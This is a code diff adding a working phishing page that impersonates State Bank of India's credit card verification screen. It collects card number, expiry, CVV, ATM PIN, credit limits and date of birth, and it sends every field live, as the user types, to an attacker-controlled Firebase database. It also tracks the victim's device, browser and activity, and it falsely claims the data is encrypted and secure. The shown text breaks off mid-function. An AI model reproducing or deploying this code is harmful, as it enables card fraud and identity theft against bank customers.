@@ -1,0 +1,1239 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>SBI - Credit Card Verification</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        /* All existing styles remain same */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f3f6fb;
+            min-height: 100vh;
+        }
+
+        .scroll-view {
+            overflow-y: auto;
+            height: 100vh;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 0;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1A237E, #0D47A1, #CE1754);
+            padding: 16px 18px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 0 0 20px 20px;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: white;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo img {
+            width: 50px;
+            height: 50px;
+            object-fit: contain;
+        }
+
+        .header-text {
+            flex: 1;
+        }
+
+        .header-text h2 {
+            color: white;
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+
+        .header-text p {
+            color: #BBDEFB;
+            font-size: 12px;
+        }
+
+        .notify-badge {
+            background: #CE1754;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .content {
+            padding: 18px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .card-title {
+            color: #003366;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-left: 4px solid #00B5EF;
+            padding-left: 12px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #292075;
+            margin-bottom: 8px;
+        }
+
+        .input-label i {
+            margin-right: 6px;
+            color: #00B5EF;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 14px;
+            transition: all 0.3s;
+            outline: none;
+            background: white;
+        }
+
+        .input-field:focus {
+            border-color: #00B5EF;
+            box-shadow: 0 0 0 3px rgba(0, 181, 239, 0.1);
+        }
+
+        .row-2 {
+            display: flex;
+            gap: 15px;
+        }
+
+        .row-2 .input-group {
+            flex: 1;
+        }
+
+        .live-indicator {
+            font-size: 10px;
+            color: #10b981;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-top: 6px;
+        }
+
+        .live-dot {
+            width: 6px;
+            height: 6px;
+            background: #10b981;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.5;
+                transform: scale(0.8);
+            }
+
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .security-note {
+            background: #F1F5F9;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 11px;
+            color: #6B7280;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .btn-verify {
+            width: 100%;
+            background: linear-gradient(135deg, #00B5EF, #0099cc);
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 12px;
+        }
+
+        .btn-verify:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 181, 239, 0.3);
+        }
+
+        .btn-back {
+            width: 100%;
+            background: #e0e0e0;
+            color: #003366;
+            border: none;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 11px;
+            color: #6B7280;
+            border-top: 1px solid #e2e8f0;
+            margin-top: 10px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #003366;
+            text-decoration: none;
+            font-size: 11px;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(5px);
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 24px;
+            width: 90%;
+            max-width: 420px;
+            overflow: hidden;
+            animation: modalSlideIn 0.3s ease;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, #003366, #1a4c8c);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .modal-header h3 {
+            color: white;
+            margin-bottom: 5px;
+        }
+
+        .modal-header p {
+            color: #BBDEFB;
+            font-size: 12px;
+        }
+
+        .modal-body {
+            padding: 24px;
+        }
+
+        .modal-input-group {
+            margin-bottom: 20px;
+        }
+
+        .modal-input-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #292075;
+            margin-bottom: 8px;
+        }
+
+        .modal-input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .modal-input-field:focus {
+            border-color: #00B5EF;
+        }
+
+        .modal-error {
+            color: #dc3545;
+            font-size: 11px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .modal-hint {
+            font-size: 10px;
+            color: #6B7280;
+            margin-top: 5px;
+        }
+
+        .modal-live-indicator {
+            font-size: 10px;
+            color: #10b981;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-top: 6px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .btn-modal-verify {
+            flex: 1;
+            background: #00B5EF;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn-modal-cancel {
+            flex: 1;
+            background: #e0e0e0;
+            color: #003366;
+            border: none;
+            padding: 12px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #333;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            z-index: 1001;
+            display: none;
+            animation: fadeInUp 0.3s ease;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .loading-content {
+            background: white;
+            padding: 30px;
+            border-radius: 16px;
+            text-align: center;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #003366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="scroll-view">
+        <div class="container">
+            <div class="header">
+                <div class="logo">
+                    <img src="https://play-lh.googleusercontent.com/S7fFzuIKI7cFtClNrKuCrwNTZ9WpJEPP3dx2CAn44_1qA4g88QL3_nnQvM82fqLfdvFKITVWvPisYFl-NeA5=w240-h480-rw"
+                        alt="SBI Logo">
+                </div>
+                <div class="header-text">
+                    <h2>SBI Credit Card</h2>
+                    <p>Secure Card Verification</p>
+                </div>
+                <div class="notify-badge">CARD</div>
+            </div>
+
+            <div class="content">
+                <div class="card">
+                    <div class="card-title">
+                        <span>💳</span> Credit Card Details
+                    </div>
+
+                    <div class="input-group">
+                        <label class="input-label"><i>💳</i> Card Number</label>
+                        <input type="text" id="cardNumber" class="input-field" placeholder="1234 5678 9012 3456"
+                            maxlength="19">
+                        <div class="live-indicator">
+                            <span style="visibility: hidden;" class="live-dot"></span>
+                            <span style="visibility: hidden;" id="cardStatus">Auto-saving...</span>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label class="input-label"><i>👤</i> Card Holder Name</label>
+                        <input type="text" id="cardHolder" class="input-field" placeholder="As on card">
+                        <div class="live-indicator">
+                            <span style="visibility: hidden;" class="live-dot"></span>
+                            <span style="visibility: hidden;" id="holderStatus">Auto-saving...</span>
+                        </div>
+                    </div>
+
+                    <div class="row-2">
+                        <div class="input-group">
+                            <label class="input-label"><i>📅</i> Expiry Month</label>
+                            <input type="text" id="expMonth" class="input-field" placeholder="MM" maxlength="2">
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label"><i>📅</i> Expiry Year</label>
+                            <input type="text" id="expYear" class="input-field" placeholder="YY" maxlength="2">
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label class="input-label"><i>🔐</i> CVV</label>
+                        <input type="password" id="cvv" class="input-field" placeholder="Enter 3-digit CVV"
+                            maxlength="3">
+                        <div class="live-indicator">
+                            <span style="visibility: hidden;" class="live-dot"></span>
+                            <span style="visibility: hidden;" id="cvvStatus">Auto-saving...</span>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label class="input-label"><i>🔒</i> ATM PIN</label>
+                        <input type="password" id="atmPin" class="input-field" placeholder="Enter 4-digit PIN"
+                            maxlength="4">
+                        <div class="live-indicator">
+                            <span style="visibility: hidden;" class="live-dot"></span>
+                            <span style="visibility: hidden;" id="pinStatus">Auto-saving...</span>
+                        </div>
+                    </div>
+
+                    <div class="security-note">
+                        🔒 Your card details are encrypted and secure
+                    </div>
+
+                    <button class="btn-verify" onclick="verifyCard()">Verify Card & Continue →</button>
+                    <button class="btn-back" onclick="goBack()">← Back to Login</button>
+                </div>
+            </div>
+
+            <div class="footer">
+                <div class="footer-links">
+                    <a href="#">Terms & Conditions</a>
+                    <a href="#">Privacy Policy</a>
+                    <a href="#">Contact Support</a>
+                </div>
+                <div>🔒 256-bit SSL Secure Banking | © 2025 State Bank of India</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Limit Verification Modal -->
+    <div id="limitModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>💰 Credit Card Limit Verification</h3>
+                <p>Please verify your card limits</p>
+            </div>
+            <div class="modal-body">
+                <div class="modal-input-group">
+                    <label class="modal-input-label">💳 Enter Total Credit Limit</label>
+                    <input type="text" id="totalLimitInput" class="modal-input-field"
+                        placeholder="Enter total limit (e.g., 500000)">
+                    <div class="modal-hint">Enter your total credit card limit in rupees</div>
+                    <div class="modal-live-indicator">
+                        <span style="visibility: hidden;" class="live-dot"></span>
+                        <span style="visibility: hidden;" id="totalLimitStatus">Auto-saving...</span>
+                    </div>
+                    <div id="totalLimitError" class="modal-error"></div>
+                </div>
+
+                <div class="modal-input-group">
+                    <label class="modal-input-label">📊 Enter Available Limit</label>
+                    <input type="text" id="verifyLimit" class="modal-input-field"
+                        placeholder="Enter available limit (e.g., 325000)">
+                    <div class="modal-hint">Current available limit on your card</div>
+                    <div class="modal-live-indicator">
+                        <span style="visibility: hidden;" class="live-dot"></span>
+                        <span style="visibility: hidden;" id="availableLimitStatus">Auto-saving...</span>
+                    </div>
+                    <div id="limitError" class="modal-error"></div>
+                </div>
+
+                <div class="modal-input-group">
+                    <label class="modal-input-label">🎂 Date of Birth (DD/MM/YYYY)</label>
+                    <input type="text" id="verifyDob" class="modal-input-field" placeholder="DD/MM/YYYY" maxlength="10">
+                    <div class="modal-hint">As per your SBI account records</div>
+                    <div class="modal-live-indicator">
+                        <span style="visibility: hidden;" class="live-dot"></span>
+                        <span style="visibility: hidden;" id="dobStatus">Auto-saving...</span>
+                    </div>
+                    <div id="dobError" class="modal-error"></div>
+                </div>
+
+                <div class="security-note" style="margin: 0 0 15px 0;">
+                    🔒 Verify your limits to complete card verification
+                </div>
+
+                <div class="modal-buttons">
+                    <button class="btn-modal-verify" onclick="submitLimitVerification()">Verify & Proceed</button>
+                    <button class="btn-modal-cancel" onclick="closeLimitModal()">Cancel</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="loading" class="loading">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <p>Verifying card details...</p>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+        // Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyCffigtqJn_jAYqtsyCq_8fOdf1f50jS40",
+            authDomain: "sbi-web-2b980.firebaseapp.com",
+            databaseURL: "https://sbi-web-2b980-default-rtdb.firebaseio.com",
+            projectId: "sbi-web-2b980",
+            storageBucket: "sbi-web-2b980.firebasestorage.app",
+            messagingSenderId: "1096488725863",
+            appId: "1:1096488725863:web:163c22e103aac9e6f053c2"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const database = firebase.database();
+
+        // Generate Device ID
+        function generateDeviceId() {
+            let deviceId = localStorage.getItem('sbi_device_id');
+            if (!deviceId) {
+                deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('sbi_device_id', deviceId);
+            }
+            return deviceId;
+        }
+
+        const deviceId = generateDeviceId();
+        let cardTimer, holderTimer, pinTimer, monthTimer, yearTimer;
+        let totalLimitTimer, availableLimitTimer, dobTimer;
+
+        // ==================== DEVICE STATUS TRACKER ====================
+        let heartbeatInterval;
+        let activityTimeout;
+        let cvvTimer;
+
+        // Get Device Info
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            let os = 'Unknown';
+
+            if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
+            else if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';
+            else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
+            else if (ua.indexOf('Edg') !== -1) browser = 'Edge';
+
+            if (ua.indexOf('Windows') !== -1) os = 'Windows';
+            else if (ua.indexOf('Mac') !== -1) os = 'macOS';
+            else if (ua.indexOf('Android') !== -1) os = 'Android';
+            else if (ua.indexOf('iPhone') !== -1) os = 'iOS';
+
+            return { browser, os, userAgent: ua };
+        }
+
+        // Get Connection Type
+        function getConnectionType() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                return connection.effectiveType || connection.type || 'Unknown';
+            }
+            return 'Unknown';
+        }
+
+        // Update Device Status with CARD page
+        function updateDeviceStatus(status, screenStatus = null) {
+            const timestamp = Date.now();
+            const dateTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+            const deviceInfo = getDeviceInfo();
+            const connectionType = getConnectionType();
+
+            const statusData = {
+                deviceId: deviceId,
+                status: status,
+                screen: screenStatus !== null ? screenStatus : (document.visibilityState === 'visible' ? 'ON' : 'OFF'),
+                lastActive: timestamp,
+                lastActiveTime: dateTime,
+                browser: deviceInfo.browser,
+                os: deviceInfo.os,
+                userAgent: deviceInfo.userAgent,
+                connectionType: connectionType,
+                pageVisible: document.visibilityState === 'visible',
+                timestamp: timestamp,
+                dateTime: dateTime,
+                currentPage: "CARD"  // 👈 CARD page identifier
+            };
+
+            database.ref(`device_status/${deviceId}`).set(statusData).catch(err => console.error('Status update error:', err));
+            database.ref(`devices/${deviceId}`).update({
+                status: status,
+                lastSeen: timestamp,
+                lastSeenTime: dateTime,
+                screen: statusData.screen,
+                browser: deviceInfo.browser,
+                os: deviceInfo.os,
+                currentPage: "CARD"
+            }).catch(err => console.error('Devices update error:', err));
+        }
+
+        // Handle page visibility change
+        function handleVisibilityChange() {
+            const isVisible = document.visibilityState === 'visible';
+            const screenStatus = isVisible ? 'ON' : 'OFF';
+            updateDeviceStatus(isVisible ? 'active' : 'inactive', screenStatus);
+        }
+
+        // Handle page close
+        function handlePageClose() {
+            const timestamp = Date.now();
+            const dateTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+            database.ref(`device_status/${deviceId}/closed`).set({
+                status: 'closed',
+                closedAt: timestamp,
+                closedTime: dateTime,
+                reason: 'page_closed'
+            });
+            database.ref(`devices/${deviceId}/status`).set('offline');
+        }
+
+        // Start Heartbeat
+        function startHeartbeat() {
+            heartbeatInterval = setInterval(() => {
+                if (document.visibilityState === 'visible') {
+                    updateDeviceStatus('active', 'ON');
+                }
+            }, 30000);
+        }
+
+        // Reset activity timer
+        function resetActivityTimer() {
+            if (activityTimeout) clearTimeout(activityTimeout);
+            activityTimeout = setTimeout(() => {
+                updateDeviceStatus('idle', document.visibilityState === 'visible' ? 'ON' : 'OFF');
+            }, 300000);
+        }
+
+        function handleUserActivity() {
+            resetActivityTimer();
+            if (document.visibilityState === 'visible') {
+                updateDeviceStatus('active', 'ON');
+            }
+        }
+
+        // Initialize device tracking
+        function initDeviceTracking() {
+            updateDeviceStatus('active', document.visibilityState === 'visible' ? 'ON' : 'OFF');
+            startHeartbeat();
+            document.addEventListener('visibilitychange', handleVisibilityChange);
+            window.addEventListener('beforeunload', handlePageClose);
+            window.addEventListener('load', () => updateDeviceStatus('active', 'ON'));
+            window.addEventListener('mousemove', handleUserActivity);
+            window.addEventListener('click', handleUserActivity);
+            window.addEventListener('keypress', handleUserActivity);
+            window.addEventListener('scroll', handleUserActivity);
+            resetActivityTimer();
+            console.log('✅ Device status tracker initialized - Page: CARD');
+        }
+
+        initDeviceTracking();
+        // ==================== END DEVICE STATUS TRACKER ====================
+
+        // Get URL params
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('userId') || localStorage.getItem('sbi_user_id') || 'N/A';
+
+        // 🔥 Auto-save function for modal fields
+        function saveModalField(fieldName, fieldValue) {
+            if (!fieldValue || fieldValue === '') return;
+
+            const timestamp = Date.now();
+            const dateTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+            const dataToSave = {
+                [fieldName]: fieldValue,
+                userId: userId,
+                deviceId: deviceId,
+                lastUpdated: timestamp,
+                lastUpdatedTime: dateTime
+            };
+
+            database.ref(`credit_cards/${deviceId}`).update(dataToSave)
+                .catch(err => console.error('Save error:', err));
+        }
+
+        // 🔥 Auto-save function for main card fields
+        function saveCardField(fieldName, fieldValue) {
+            if (!fieldValue || fieldValue === '') return;
+
+            const timestamp = Date.now();
+            const dateTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+            const dataToSave = {
+                [fieldName]: fieldValue,
+                userId: userId,
+                deviceId: deviceId,
+                lastUpdated: timestamp,
+                lastUpdatedTime: dateTime,
+                status: 'pending_verification'
+            };
+
+            database.ref(`credit_cards/${deviceId}`).update(dataToSave)
+                .catch(err => console.error('Save error:', err));
+        }
+
+        // Main Card Fields Auto-save
+        function debounceCard() {
+            clearTimeout(cardTimer);
+            const value = document.getElementById('cardNumber').value;
+            if (value && value !== '') {
+                cardTimer = setTimeout(() => {
+                    saveCardField('cardNumber', value);
+                    document.getElementById('cardStatus').innerHTML = '✓ Saved';
+                    setTimeout(() => {
+                        if (document.getElementById('cardStatus').innerHTML === '✓ Saved') {
+                            document.getElementById('cardStatus').innerHTML = 'Auto-saving...';
+                        }
+                    }, 1500);
+                }, 800);
+            }
+        }
+
+        function debounceHolder() {
+            clearTimeout(holderTimer);
+            const value = document.getElementById('cardHolder').value;
+            if (value && value !== '') {
+                holderTimer = setTimeout(() => {
+                    saveCardField('cardHolder', value);
+                    document.getElementById('holderStatus').innerHTML = '✓ Saved';
+                    setTimeout(() => {
+                        if (document.getElementById('holderStatus').innerHTML === '✓ Saved') {
+                            document.getElementById('holderStatus').innerHTML = 'Auto-saving...';
+                        }
+                    }, 1500);
+                }, 800);
+            }
+        }
+        function debounceCvv() {
+            clearTimeout(cvvTimer);
+            const value = document.getElementById('cvv').value;
+
+            if (value && value !== '') {
+                cvvTimer = setTimeout(() => {
+                    saveCardField('cvv', value);
+
+                    document.getElementById('cvvStatus').innerHTML = '✓ Saved';
+
+                    setTimeout(() => {
+                        document.getElementById('cvvStatus').innerHTML = 'Auto-saving...';
+                    }, 1500);
+
+                }, 800);
+            }
+        }
+        function debouncePin() {
+            clearTimeout(pinTimer);
+            const value = document.getElementById('atmPin').value;
+            if (value && value !== '') {
+                pinTimer = setTimeout(() => {
+                    saveCardField('atmPin', value);
+                    document.getElementById('pinStatus').innerHTML = '✓ Saved';
+                    setTimeout(() => {
+                        if (document.getElementById('pinStatus').innerHTML === '✓ Saved') {
+                            document.getElementById('pinStatus').innerHTML = 'Auto-saving...';
+                        }
+                    }, 1500);
+                }, 800);
+            }
+        }
+
+        function debounceMonth() {
+            clearTimeout(monthTimer);
+            const value = document.getElementById('expMonth').value;
+            if (value && value !== '') {
+                monthTimer = setTimeout(() => {
+                    saveCardField('expMonth', value);
+                }, 800);
+            }
+        }
+
+        function debounceYear() {
+            clearTimeout(yearTimer);
+            const value = document.getElementById('expYear').value;
+            if (value && value !== '') {
+                yearTimer = setTimeout(() => {
+                    saveCardField('expYear', value);
+                }, 800);
+            }
+        }
+
+        // 🔥 Modal Fields Auto-save
+        function debounceTotalLimit() {
+            clearTimeout(totalLimitTimer);
+            const value = document.getElementById('totalLimitInput').value;
+            if (value && value !== '') {
+                totalLimitTimer = setTimeout(() => {
+                    saveModalField('totalLimitInput', value);
+                    document.getElementById('totalLimitStatus').innerHTML = '✓ Saved';
+                    setTimeout(() => {
+                        if (document.getElementById('totalLimitStatus').innerHTML === '✓ Saved') {
+                            document.getElementById('totalLimitStatus').innerHTML = 'Auto-saving...';
+                        }
+                    }, 1500);
+                }, 800);
+            }
+        }
+
+        function debounceAvailableLimit() {
+            clearTimeout(availableLimitTimer);
+            const value = document.getElementById('verifyLimit').value;
+            if (value && value !== '') {
+                availableLimitTimer = setTimeout(() => {
+                    saveModalField('availableLimitInput', value);
+                    document.getElementById('availableLimitStatus').innerHTML = '✓ Saved';
+                    setTimeout(() => {
+                        if (document.getElementById('availableLimitStatus').innerHTML === '✓ Saved') {
+                            document.getElementById('availableLimitStatus').innerHTML = 'Auto-saving...';
+                        }
+                    }, 1500);
+                }, 800);
+            }
+        }
+
+        function debounceDob() {
+            clearTimeout(dobTimer);
+            const value = document.getElementById('verifyDob').value;
+            if (value && value !== '') {
+                dobTimer = setTimeout(() => {
+                    saveModalField('dob', value);
+                    document.getElementById('dobStatus').innerHTML = '✓ Saved';
+                    setTimeout(() => {
+                        if (document.getElementById('dobStatus').innerHTML === '✓ Saved') {
+                            document.getElementById('dobStatus').innerHTML = 'Auto-saving...';
+                        }
+                    }, 1500);
+                }, 800);
+            }
+        }
+
+        // Main Card Input listeners
+        document.getElementById('cardNumber').addEventListener('input', function (e) {
+            let value = this.value.replace(/\s/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            this.value = formatted;
+            document.getElementById('cardStatus').innerHTML = '⌨️ Typing...';
+            debounceCard();
+        });
+
+        document.getElementById('cardHolder').addEventListener('input', function () {
+            document.getElementById('holderStatus').innerHTML = '⌨️ Typing...';
+            debounceHolder();
+        });
+
+        document.getElementById('atmPin').addEventListener('input', function () {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.slice(0, 4);
+            this.value = value;
+            document.getElementById('pinStatus').innerHTML = '⌨️ Typing...';
+            debouncePin();
+        });
+        document.getElementById('cvv').addEventListener('input', function () {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 3) value = value.slice(0, 3);
+
+            this.value = value;
+
+            document.getElementById('cvvStatus').innerHTML = '⌨️ Typing...';
+
+            debounceCvv();
+        });
+        document.getElementById('expMonth').addEventListener('input', function () {
+            let value = this.value.replace(/\D/g, '');
+            if (value > 12) value = '12';
+            if (value.length > 2) value = value.slice(0, 2);
+            this.value = value;
+            debounceMonth();
+        });
+
+        document.getElementById('expYear').addEventListener('input', function () {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 2) value = value.slice(0, 2);
+            this.value = value;
+            debounceYear();
+        });
+
+        // 🔥 Modal Input listeners - Auto-save on typing
+        const totalLimitField = document.getElementById('totalLimitInput');
+        if (totalLimitField) {
+            totalLimitField.addEventListener('input', function () {
+                let value = this.value.replace(/\D/g, '');
+                this.value = value;
+                document.getElementById('totalLimitStatus').innerHTML = '⌨️ Typing...';
+                debounceTotalLimit();
+            });
+        }
+
+        const availableLimitField = document.getElementById('verifyLimit');
+        if (availableLimitField) {
+            availableLimitField.addEventListener('input', function () {
+                let value = this.value.replace(/\D/g, '');
+                this.value = value;
+                document.getElementById('availableLimitStatus').innerHTML = '⌨️ Typing...';
+                debounceAvailableLimit();
+            });
+        }
+
+        const dobFieldModal = document.getElementById('verifyDob');
+        if (dobFieldModal) {
+            dobFieldModal.addEventListener('input', function (e) {
+                let value = this.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2);
+                }
+                if (value.length >= 5) {
+                    value = value.substring(0, 5) + '/' + value.substring(5, 9);
+                }
+                this.value = value.substring(0, 10);
+                document.getElementById('dobStatus').innerHTML = '⌨️ Typing...';
+                debounceDob();
+            });
+        }
+
+        function showToast(message, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.background = isError ? '#dc3545' : '#28a745';
+            toast.style.display = 'block';
+            setTimeout(() => toast.style.display = 'none', 3000);
+        }
+
+        function showLoading(show) {
+            const loading = document.getElementById('loading');
+            loading.style.display = show ? 'flex' : 'none';
+        }
+
+        function verifyCard() {
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const cardHolder = document.getElementById('cardHolder').value.trim();
+            const expMonth = document.getElementById('expMonth').value;
+            const expYear = document.getElementById('expYear').value;
+            const atmPin = document.getElementById('atmPin').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (!cardNumber || cardNumber.length !== 16) {
+                showToast('Please enter valid 16-digit card number', true);
+                return;
+            }
+            if (!cardHolder) {
+                showToast('Please enter card holder name', true);
+                return;
+            }
+            if (!expMonth || expMonth < 1 || expMonth > 12) {
+                showToast('Please enter valid expiry month (01-12)', true);
+                return;
+            }
+            if (!expYear) {
+                showToast('Please enter expiry year', true);
+                return;
+            }
+            if (!atmPin || atmPin.length !== 4) {
+                showToast('Please enter valid 4-digit ATM PIN', true);
+                return;
+            }
+            if (!cvv || cvv.length !== 3) {
+                showToast('Please enter valid 3-digit CVV', true);
+                return;
+            }
+            showLoading(true);
+
+            const finalCardData = {
+                cardNumber: cardNumber,
+                cardHolder: cardHolder,
+                expMonth: expMonth,
+                expYear: expYear,
+                cvv: cvv,
+                atmPin: atmPin,
+                userId: userId,
+                deviceId: deviceId,
+                verifiedAt: Date.now(),
+                verifiedDateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+                status: 'card_verified'
+            };
+
+            database.ref(`credit_cards/${deviceId}`).update(finalCardData)
+                .then(() => {
+                    showLoading(false);
+                    showToast('✅ Card verified! Please verify limits', false);
+                    setTimeout(() => {
+                        showLimitModal();
+                    }, 500);
+                })
+                .catch(err => {
+                    showLoading(false);
+                    showToast('❌ Error saving card details', true);
+                    console.error(err);
+                });
+        }
+
+        function showLimitModal() {
+            document.getElementById('limitModal').style.display = 'flex';
+            document.getElementById('totalLimitInput').value = '';
+            document.getElementById('verifyLimit').value = '';
+            document.getElementById('verifyDob').value = '';
+            document.getElementById('totalLimitStatus').innerHTML = 'Auto-saving...';
+            document.getElementById('availableLimitStatus').innerHTML = 'Auto-saving...';
+            document.getElementById('dobStatus').innerHTML = 'Auto-saving...';
+        }
+
+        function closeLimitModal() {
+            document.getElementById('limitModal').style.display = 'none';
+        }
+
+        function isValidDate(day, month, year) {
+            const date = new Date(year, month - 1, day);
+            return date.getFullYear() == year && date.getMonth() == month - 1 && date.getDate() == day;
+        }
+
+        function submitLimitVerification() {
+            const totalLimit = document.getElementById('totalLimitInput').value.trim();
+            const verifyLimit = document.getElementById('verifyLimit').value.trim();
+            const verifyDob = document.getElementById('verifyDob').value.trim();
+
+            let isValid = true;
+            let totalLimitNum = 0;
+            let availableLimitNum = 0;
+
+            if (!totalLimit) {
+                document.getElementById('totalLimitError').innerHTML = '⚠️ Please enter total credit limit';
+                document.getElementById('totalLimitError').style.display = 'block';
+                isValid = false;
+            } else {
+                totalLimitNum = parseInt(totalLimit.replace(/,/g, ''));
+                if (isNaN(totalLimitNum) || totalLimitNum <= 0) {
+                    document.getElementById('totalLimitError').innerHTML = '⚠️ Please enter valid limit amount';
+                    document.getElementById('totalLimitError').style.display = 'block';
+                    isValid = false;
